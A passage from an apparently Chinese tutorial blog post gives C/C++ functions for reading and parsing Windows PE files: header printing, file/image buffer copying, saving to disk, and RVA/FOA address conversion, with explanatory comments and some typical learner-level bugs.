</span></span><br><span class="line">	<span class="built_in">fclose</span>(pFile);	</span><br><span class="line">    <span class="keyword">return</span> pFileBuffer;		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-ReadPESize"><a href="#2-ReadPESize" class="headerlink" title="2 ReadPESize"></a>2 ReadPESize</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">读取文件大小</span></span><br><span class="line"><span class="comment">参数：文件路径</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">DWORD <span class="title">ReadPESize</span><span class="params">(LPSTR lpszFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;		</span><br><span class="line">	FILE *pFile = <span class="literal">NULL</span>;	</span><br><span class="line">	DWORD fileSize = <span class="number">0</span>;              <span class="comment">//typedef unsigned long 	DWORD		</span></span><br><span class="line">	<span class="comment">//打开文件	</span></span><br><span class="line">	pFile = <span class="built_in">fopen</span>(lpszFile, <span class="string">&quot;rb&quot;</span>);   <span class="comment">//返回一个指向FILE类型的指针/NULL	</span></span><br><span class="line">	<span class="keyword">if</span>(!pFile)	</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; 无法打开 EXE 文件! &quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//读取文件大小		</span></span><br><span class="line">	<span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_END);       <span class="comment">//int fseek（FILE *fp，long offset，int fromwhere）；</span></span><br><span class="line">	fileSize = <span class="built_in">ftell</span>(pFile);         <span class="comment">//将fp的文件位置指针从fromwhere开始移动offset个字节指示下一个要读取的数据的位置</span></span><br><span class="line">	<span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_SET);       <span class="comment">//SEEK_SET或0，代表文件开始处；SEEK_CUR或1，代表文件当前位置；SEEK_END或2，代表文件结尾处。</span></span><br><span class="line">	<span class="comment">//关闭文件	</span></span><br><span class="line">	<span class="built_in">fclose</span>(pFile);	</span><br><span class="line">	<span class="keyword">return</span> fileSize;		</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>

<h2 id="3-PrintNTHeaders"><a href="#3-PrintNTHeaders" class="headerlink" title="3 PrintNTHeaders"></a>3 PrintNTHeaders</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">打印PE文件头部信息</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span>		</span><br><span class="line"><span class="function">VOID <span class="title">PrintNTHeaders</span><span class="params">()</span>		</span></span><br><span class="line"><span class="function"></span>&#123;		</span><br><span class="line">	LPVOID pFileBuffer = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_FILE_HEADER pPEHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PDWORD FILESIZE_1 = <span class="literal">NULL</span>;</span><br><span class="line">		</span><br><span class="line">	pFileBuffer = ReadPEFile(FILEPATH);	</span><br><span class="line">	<span class="keyword">if</span>(!pFileBuffer)	</span><br><span class="line">		&#123;	</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;文件读取失败\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> ; </span><br><span class="line">		&#125;	</span><br><span class="line">		</span><br><span class="line">	<span class="comment">//判断是否是有效的MZ标志	</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)	</span><br><span class="line">		&#123;	</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;不是有效的MZ标志\n&quot;</span>);</span><br><span class="line">			<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">			<span class="keyword">return</span> ; </span><br><span class="line">		&#125;	</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;	</span><br><span class="line">	<span class="comment">//打印DOS头	</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************DOS头********************\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MZ标志：%x\n&quot;</span>,pDosHeader-&gt;e_magic);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;PE偏移：%x\n&quot;</span>,pDosHeader-&gt;e_lfanew);	</span><br><span class="line">	<span class="comment">//判断是否是有效的PE标志	</span></span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((DWORD)pFileBuffer+pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)	</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;不是有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//(DWORD)pFileBuffer---将pFileBuffer指向的地址转化为DWORD型</span></span><br><span class="line">	<span class="comment">//两种修改方式：可以将指针的地址转换成BYTE *型（加数字的时候加的大小为去掉一个*后的类型大小）</span></span><br><span class="line">	<span class="comment">//或者转换成数字DWORD</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pFileBuffer+pDosHeader-&gt;e_lfanew);	   </span><br><span class="line">	<span class="comment">//打印NT头																												</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************NT头********************\n&quot;</span>);											</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;NT签名：%x\n&quot;</span>,pNTHeader-&gt;Signature);	</span><br><span class="line">	pPEHeader = (PIMAGE_FILE_HEADER)(((BYTE *)pNTHeader) + <span class="number">4</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************PE头********************\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;PE-Machine：%x\n&quot;</span>,pPEHeader-&gt;Machine);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;节的数量：%x\n&quot;</span>,pPEHeader-&gt;NumberOfSections);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;SizeOfOptionalHeader：%x\n&quot;</span>,pPEHeader-&gt;SizeOfOptionalHeader);	</span><br><span class="line">	<span class="comment">//可选PE头	</span></span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pPEHeader+IMAGE_SIZEOF_FILE_HEADER);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************OPTIOIN_PE头********************\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OPTION_PE-Magic：%x\n&quot;</span>,pOptionHeader-&gt;Magic);	</span><br><span class="line"></span><br><span class="line">	pSectionHeader=(PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader+pPEHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************节表********************\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;pPEHeader-&gt;NumberOfSections;i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Name：%s\n&quot;</span>,pSectionHeader-&gt;Name);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Misc：%x\n&quot;</span>,pSectionHeader-&gt;Misc);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;VirtualAddress：%x\n&quot;</span>,pSectionHeader-&gt;VirtualAddress);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeOfRawData：%x\n&quot;</span>,pSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;PointerToRawData：%x\n&quot;</span>,pSectionHeader-&gt;PointerToRawData);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Characteristics：%x\n&quot;</span>,pSectionHeader-&gt;Characteristics);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                pSectionHeader+=<span class="number">0x1</span>;<span class="comment">//这里应该加什么？</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//printf(&quot;%x\n&quot;,pSectionHeader);</span></span><br><span class="line">		<span class="comment">//printf(&quot;%x\n&quot;,pSectionHeader+1);</span></span><br><span class="line">	<span class="comment">//释放内存	</span></span><br><span class="line">	<span class="built_in">free</span>(pFileBuffer);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-CopyFileBufferToImageBuffer"><a href="#4-CopyFileBufferToImageBuffer" class="headerlink" title="4 CopyFileBufferToImageBuffer"></a>4 CopyFileBufferToImageBuffer</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************					将文件从FileBuffer复制到ImageBuffer							</span></span><br><span class="line"><span class="comment">参数说明：							</span></span><br><span class="line"><span class="comment">pFileBuffer  FileBuffer指针							</span></span><br><span class="line"><span class="comment">pImageBuffer ImageBuffer指针							</span></span><br><span class="line"><span class="comment">返回值说明：							</span></span><br><span class="line"><span class="comment">读取失败返回0  否则返回复制的大小	</span></span><br><span class="line"><span class="comment">IN OUT仅做标志用，原型：#define IN，#define IN</span></span><br><span class="line"><span class="comment">**************************************************************************/</span></span><br><span class="line"><span class="function">DWORD <span class="title">CopyFileBufferToImageBuffer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	IN LPVOID pFileBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">	OUT LPVOID *pImageBuffer</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID pTempFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span>(pFileBuffer ==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pFileBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//找到所有PE文件结构的头地址</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//根据SizeOfImage申请空间哦</span></span><br><span class="line">	pTempFileBuffer = <span class="built_in">malloc</span>(pOptionHeader-&gt;SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!pTempFileBuffer)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pTempFileBuffer空间申请失败...&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(pTempFileBuffer, <span class="number">0</span>, pOptionHeader-&gt;SizeOfImage);</span><br><span class="line">	<span class="built_in">memcpy</span>(pTempFileBuffer, pDosHeader, pOptionHeader-&gt;SizeOfHeaders);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span>(DWORD i = <span class="number">0</span>; i &lt; pFileHeader-&gt;NumberOfSections; i++)&#123;</span><br><span class="line">	<span class="built_in">memcpy</span>((PVOID)((BYTE *)pTempFileBuffer + (pSectionHeader + i)-&gt;VirtualAddress), (PVOID)((BYTE *)pDosHeader + (pSectionHeader + i)-&gt;PointerToRawData), (pSectionHeader + i)-&gt;SizeOfRawData);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	*pImageBuffer = pTempFileBuffer;</span><br><span class="line">	pTempFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> pOptionHeader-&gt;SizeOfImage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-CopyImageBufferToNewFileBuffer"><a href="#5-CopyImageBufferToNewFileBuffer" class="headerlink" title="5 CopyImageBufferToNewFileBuffer"></a>5 CopyImageBufferToNewFileBuffer</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************					</span></span><br><span class="line"><span class="comment">将ImageBuffer中的数据复制到新的缓冲区							</span></span><br><span class="line"><span class="comment">参数说明：							</span></span><br><span class="line"><span class="comment">pImageBuffer ImageBuffer指针							</span></span><br><span class="line"><span class="comment">pNewBuffer NewBuffer指针							</span></span><br><span class="line"><span class="comment">返回值说明：							</span></span><br><span class="line"><span class="comment">读取失败返回0  否则返回复制的大小							</span></span><br><span class="line"><span class="comment">**************************************************************************/</span>							</span><br><span class="line"><span class="function">DWORD <span class="title">CopyImageBufferToNewFileBuffer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	IN LPVOID pImageBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">	OUT LPVOID *pNewFileBuffer</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span>(pImageBuffer ==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pImageBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//找到所有PE文件结构的头地址</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="keyword">for</span>(DWORD i = <span class="number">0</span>; i &lt; pFileHeader-&gt;NumberOfSections; i++)&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;pSectionHeader-&gt;Name = &quot;</span> &lt;&lt; (pSectionHeader + i)-&gt;Name &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">memcpy</span>((PVOID)((BYTE *)pDosHeader + (pSectionHeader + i)-&gt;PointerToRawData), (PVOID)((BYTE *)pImageBuffer + (pSectionHeader + i)-&gt;VirtualAddress), (pSectionHeader + i)-&gt;SizeOfRawData);</span><br><span class="line">	&#125;</span><br><span class="line">	*pNewFileBuffer = pImageBuffer;</span><br><span class="line">	pImageBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> pOptionHeader-&gt;SizeOfImage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="6-NewFileBufferToFile"><a href="#6-NewFileBufferToFile" class="headerlink" title="6 NewFileBufferToFile"></a>6 NewFileBufferToFile</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************</span></span><br><span class="line"><span class="comment">将内存中的数据复制到文件							</span></span><br><span class="line"><span class="comment">参数说明：							</span></span><br><span class="line"><span class="comment">pNewFileBuffer 内存中数据的指针							</span></span><br><span class="line"><span class="comment">size 要复制的大小							</span></span><br><span class="line"><span class="comment">lpszFile 要存储的文件路径							</span></span><br><span class="line"><span class="comment">返回值说明：							</span></span><br><span class="line"><span class="comment">读取失败返回0  否则返回复制的大小							</span></span><br><span class="line"><span class="comment">**************************************************************************/</span>	</span><br><span class="line"><span class="function">BOOL <span class="title">NewFileBufferToFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	IN LPVOID pNewFileBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">	OUT LPSTR lpszFile</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(pNewFileBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pNewFileBuffer缓冲区出差...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	FILE *pFile = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">size_t</span> fileSize = size;</span><br><span class="line">	pFile = fopen(lpszFile, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!pFile)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fopen保存EXE文件失败...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">size_t</span> n = fwrite(pNewFileBuffer, fileSize, <span class="number">1</span>, pFile);</span><br><span class="line">	<span class="keyword">if</span>(!n)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fwrite数据写入失败...\n&quot;</span>);</span><br><span class="line">		fclose(pFile);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(pFile);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;存盘成功\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="7-RVAToFOA"><a href="#7-RVAToFOA" class="headerlink" title="7 RVAToFOA"></a>7 RVAToFOA</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************	</span></span><br><span class="line"><span class="comment">编写一个函数，能够将VA的值转换成FOA</span></span><br><span class="line"><span class="comment">	先定位该RVA在哪一个节</span></span><br><span class="line"><span class="comment">	VA = FOA  - PointerToRawData + VirtualAddress + ImageBase</span></span><br><span class="line"><span class="comment">	RVA = VA - ImageBase</span></span><br><span class="line"><span class="comment">	FOA = VA - ImageBase - VirtualAddress + PointerToRawData</span></span><br><span class="line"><span class="comment">参数：需要转换的RVA，该文件的FileBuffer</span></span><br><span class="line"><span class="comment">**************************************************************************/</span></span><br><span class="line"><span class="function">DWORD <span class="title">RVAToFOA</span><span class="params">(DWORD RVA,PVOID pImageBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 初始化PE头部结构体</span></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD VA = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pImageBuffer ==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pImageBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//找到所有PE文件结构的头地址</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"> 	</span><br><span class="line"> 	VA = RVA + pOptionHeader-&gt;ImageBase;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;=pFileHeader-&gt;NumberOfSections; i++) </span><br><span class="line">	&#123;          </span><br><span class="line">		<span class="keyword">if</span> (RVA &gt;= (pSectionHeader-&gt;VirtualAddress) &amp;&amp; RVA &lt; (pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize)) </span><br><span class="line">		&#123; 	   </span><br><span class="line">			<span class="keyword">return</span> (RVA - pSectionHeader-&gt;VirtualAddress) + pSectionHeader-&gt;PointerToRawData; </span><br><span class="line">		&#125; </span><br><span class="line">		pSectionHeader++; </span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="8-FOAToRVA"><a href="#8-FOAToRVA" class="headerlink" title="8 FOAToRVA"></a>8 FOAToRVA</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/***************************************************************************	</span></span><br><span class="line"><span class="comment">编写一个函数，能够将FOA的值转换成RVA</span></span><br><span class="line"><span class="comment">	先定位该FOA在哪一个节</span></span><br><span class="line"><span class="comment">	RVA = FOA - PointerToRawData + VirtualAddress</span></span><br><span class="line"><span class="comment">	VA = FOA  - PointerToRawData + VirtualAddress + ImageBase</span></span><br><span class="line"><span class="comment">	RVA = VA - ImageBase</span></span><br><span class="line"><span class="comment">	FOA = VA - ImageBase - VirtualAddress + PointerToRawData</span></span><br><span class="line"><span class="comment">参数：需要转换的FOA，该文件的FileBuffer</span></span><br><span class="line"><span class="comment">***************************************************************************/</span></span><br><span class="line"><span class="function">DWORD <span class="title">FOAToRVA</span><span class="params">(DWORD FOA,PVOID pImageBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 初始化PE头部结构体</span></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pImageBuffer ==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pImageBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//找到所有PE文件结构的头地址</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"> 	</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;=pFileHeader-&gt;NumberOfSections; i++) </span><br><span class="line">	&#123;          </span><br><span class="line">		<span class="keyword">if</span> (FOA &gt;= (pSectionHeader-&gt;PointerToRawData) &amp;&amp; FOA &lt; (pSectionHeader-&gt;PointerToRawData + pSectionHeader-&gt;SizeOfRawData)) </span><br><span class="line">		&#123; 	   </span><br><span class="line">			<span class="keyword">return</span> FOA - pSectionHeader-&gt;PointerToRawData + pSectionHeader-&gt;VirtualAddress; </span><br><span class="line">		&#125; </span><br><span class="line">		pSectionHeader++; </span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span 